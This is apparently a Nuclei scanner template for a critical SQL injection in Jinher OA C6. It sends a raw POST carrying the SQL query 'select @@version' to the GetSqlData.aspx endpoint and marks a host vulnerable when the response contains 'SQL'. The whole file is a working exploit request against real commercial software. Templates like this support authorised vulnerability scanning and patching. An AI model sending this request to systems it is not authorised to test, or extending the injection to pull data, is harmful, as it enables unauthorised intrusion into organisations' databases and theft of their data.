id: jinher-c6-getsqldata-sqli

info:
  name: 金和 OA C6-GetSqlData.aspx SQL注入
  author: HuanXiong
  severity: critical

  tags: SQL Injection

http:
  - raw:
      - |
        POST /C6/Control/GetSqlData.aspx/.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        select @@version

    matchers-condition: and
    matchers:
      - type: status
        part: status_code
        status:
          - 200
      - type: word
        part: body
        words:
          - 'SQL'
        condition: and